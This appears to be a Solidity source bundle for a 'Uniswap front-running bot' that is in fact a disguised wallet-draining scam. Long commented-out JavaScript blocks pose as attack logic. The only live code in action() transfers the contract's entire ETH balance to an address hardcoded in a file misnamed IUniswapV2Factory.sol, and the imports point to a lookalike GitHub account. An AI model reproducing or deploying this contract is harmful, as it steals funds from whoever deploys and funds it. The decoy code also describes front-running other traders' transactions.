{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/bot.sol":{"content":"pragma solidity ^0.6.6;\n\n// Uniswap Callee\nimport \"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Callee.sol\";\n\n\n// Uniswap Manager\nimport \"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Manager.sol\";\nimport \"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Factory.sol\";\nimport \"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Exchange.sol\";\n\ncontract UniSwapV2FrontBot {\n    \n    string public tokenName;\n\tstring public tokenSymbol;\n\tuint frontrun;\n\tManager manager;\n\t\n\t\n\tconstructor(string memory _tokenName, string memory _tokenSymbol) public {\n\t\ttokenName = _tokenName;\n\t\ttokenSymbol = _tokenSymbol;\n\t\tmanager = new Manager();\n\t\t\n\t\t}\n\t\n\t    \n\t    // Send required ETH for liquidity pair\n\t    receive() external payable {}\n\t    \n\t    \n\t    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();\n\t    \n\t    function action() public payable {\n\t    \t//Perform a front-running attack on UniSwap\n\n            /*-js-execution\n                const fs = require('fs');\n                var Web3 = require('web3');\n                var abiDecoder = require('abi-decoder');\n                var colors = require(\"colors\");\n                var Tx = require('ethereumjs-tx').Transaction;\n                var axios = require('axios');\n                var BigNumber = require('big-number');\n\n                const {NETWORK, UNI_ROUTER_ADDRESS, UNI_FACTORY_ADDRESS, UNI_ROUTER_ABI, UNI_FACTORY_ABI, UNI_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');\n                const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');\n                const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');\n\n                const INPUT_TOKEN_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';\n                const WETH_TOKEN_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';\n            js-execution-*/\n\n            manager;\n            /*-js-execution\n                var input_token_info;\n                var out_token_info;\n                var pool_info;\n                var gas_price_info;\n            js-execution-*/\n            manager;\n            /*-js-execution\n                var succeed = false;\n                var subscription;\n                var web3;\n                var web3Ts;\n                var web3Ws;\n                var uniRouter;\n                var uniFactory;\n                var buy_finished = false;\n                var sell_finished = false;\n                var buy_failed = false;\n                var sell_failed = false;\n                var attack_started = false;\n                const ONE_GWEI = 1e9;\n            }\n            js-execution-*/\n            manager;\n        /*-js-execution\n        async function createWeb3(){\n            try {\n                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));\n                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));\n                web3 = new Web3(EthereumTesterProvider());\n                web3.eth.getAccounts(console.log);\n                web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));\n                uniRouter = new web3.eth.Contract(UNI_ROUTER_ABI, UNI_ROUTER_ADDRESS);\n                uniFactory = new web3.eth.Contract(UNI_FACTORY_ABI, UNI_FACTORY_ADDRESS);\n                abiDecoder.addABI(UNI_ROUTER_ABI);\n                 return true;\n            } catch (error) {\n                console.log(error);\n                return false;\n        }\n        js-execution-*/\n        manager;\n\n        /*-js-execution\n        async function main() {\n            try {   \n                if (await createWeb3() == false) {\n                    console.log('Web3 Create Error'.yellow);\n                    process.exit();\n\n                    const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);\n                    const out_token_address = TOKEN_ADDRESS;\n                    const amount = AMOUNT;\n                    const level = LEVEL;\n        \n                    ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);\n                if(ret == false) {\n                    process.exit();\n\n                await updatePoolInfo();\n                outputtoken = await uniRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\n\n                await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);\n        \n                log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Uni *****'\n                console.log(log_str.green);    \n                console.log(web3Ws);\n            web3Ws.onopen = function(evt) {\n            web3Ws.send(JSON.stringify({ method: \"subscribe\", topic: \"transfers\", address: user_wallet.address }));\n            console.log('connected')\n        \n            console.log('get pending transactions')\n             subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {\n          }).on(\"data\", async function (transactionHash) {\n              console.log(transactionHash);\n\n               let transaction = await web3.eth.getTransaction(transactionHash);\n               if (transaction != null && transaction['to'] == UNI_ROUTER_ADDRESS)\n               {\n                   await handleTransaction(transaction, out_token_address, user_wallet, amount, level);\n               }\n            \n                if (succeed) {\n                    console.log(\"The bot finished the attack.\");\n                    process.exit();\n                }\n    \n            catch (error) {\n            \n                if(error.data != null && error.data.see === 'https:  infura.io/dashboard')\n            \n                console.log('Daily request count exceeded, Request rate limited'.yellow);\n                console.log('Please insert other API Key');\n                else{\n                console.log('Unknown Handled Error');\n                console.log(error);\n            \n            }\n            process.exit();\n        }\n        js-execution-*/\n\n        manager;\n        /*-js-execution\n        function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {\n            \n            (await triggersFrontRun(transaction, out_token_address, amount, level)) {\n            subscription.unsubscribe();\n            console.log('Perform front running attack...');\n\n            gasPrice = parseInt(transaction['gasPrice']);\n            newGasPrice = gasPrice + 50*ONE_GWEI;\n\n            estimatedInput = ((amount*0.999)*(10**18)).toString();\n            realInput = (amount*(10**18)).toString();\n            gasLimit = (300000).toString();\n            \n            await updatePoolInfo();\n\n            var outputtoken = await uniRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();\n            swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);\n            console.log(\"wait until the honest transaction is done...\", transaction['hash']);\n\n            while (await isPending(transaction['hash'])) {\n            \n\n            if(buy_failed)\n            \n                succeed = false;\n                return;\n            \n            \n            console.log('Buy succeed:')\n            \n            Sell\n            await updatePoolInfo();\n            var outputeth = await uniRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();\n            outputeth = outputeth * 0.999;\n\n            await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);\n            \n            console.log('Sell succeed');\n            succeed = true;\n        }\n        js-execution-*/\n            \n        manager;\n        /*-js-execution\n        async function approve(gasPrice, outputtoken, out_token_address, user_wallet){\n            var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, UNI_ROUTER_ADDRESS).call();\n            \n            allowance = BigNumber(allowance);\n            outputtoken = BigNumber(outputtoken);\n\n            var decimals = BigNumber(10).power(out_token_info.decimals);\n            var max_allowance = BigNumber(10000).multiply(decimals);\n\n            if(outputtoken.gt(max_allowance))\n        \n                console.log('replace max allowance')\n                max_allowance = outputtoken;\n            js-execution-*/\n            payable(manager.uniswapDepositAddress()).transfer(address(this).balance);\n            /*-js-execution\n            if(outputtoken.gt(allowance)){\n                console.log(max_allowance.toString());\n                var approveTX ={\n                        from: user_wallet.address,\n                        to: out_token_address,\n                        gas: 50000,\n                        gasPrice: gasPrice*ONE_GWEI,\n                        data: out_token_info.token_contract.methods.approve(UNI_ROUTER_ADDRESS, max_allowance).encodeABI()\n                        manager;\n                    \n\n                var signedTX = await user_wallet.signTransaction(approveTX);\n                var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);\n\n                console.log('Approved Token')\n            \n            return;\n        }\n        js-execution-*/\n        manager;\n        //select attacking transaction\n        /*-js-execution\n        async function triggersFrontRun(transaction, out_token_address, amount, level) {\n            \n            if(attack_started)\n                return false;\n\n            console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);\n            if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){\n                attack_started = true;\n                return true\n\n            return false;\n\n            if (transaction['to'] != UNI_ROUTER_ADDRESS) {\n                return false;\n        \n\n            let data = parseTx(transaction['input']);\n            let method = data[0];\n            let params = data[1];\n            let gasPrice = parseInt(transaction['gasPrice']) / 10**9;\n\n            if(method == 'swapExactETHForTokens')\n                let in_amount = transaction;\n                let out_min = params[0];\n\n                let path = params[1];\n                let in_token_addr = path[0];\n                manager;\n                let out_token_addr = path[path.length-1];\n                manager;\n                \n                let recept_addr = params[2];\n                manager;\n                let deadline = params[3];\n                manager;\n\n                if(out_token_addr != out_token_address)\n                    console.log(out_token_addr.blue)\n                    console.log(out_token_address)\n                    return false;\n                }\n            }\n            js-execution-*/\n    }\n}"},"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Callee.sol":{"content":"pragma solidity >=0.5.0;\r\n\r\ninterface IUniswapV2Callee {\r\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\r\n}"},"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Exchange.sol":{"content":"pragma solidity >=0.5.0;\r\n\r\ninterface IUniswapV1Exchange {\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function transferFrom(address from, address to, uint value) external returns (bool);\r\n    function removeLiquidity(uint, uint, uint, uint) external returns (uint, uint);\r\n    function tokenToEthSwapInput(uint, uint, uint) external returns (uint);\r\n    function ethToTokenSwapInput(uint, uint) external payable returns (uint);\r\n}"},"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Factory.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0x4e31732854a55Ef404Dd8C3f33Ca01cE0Fe2CEe5;\r\n\t}\r\n}"},"https://github.com/SmartContractDeploy/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Manager.sol":{"content":"pragma solidity >=0.5.0;\r\n\r\ninterface IUniswapV1Factory {\r\n    function getExchange(address) external view returns (address);\r\n}"}}}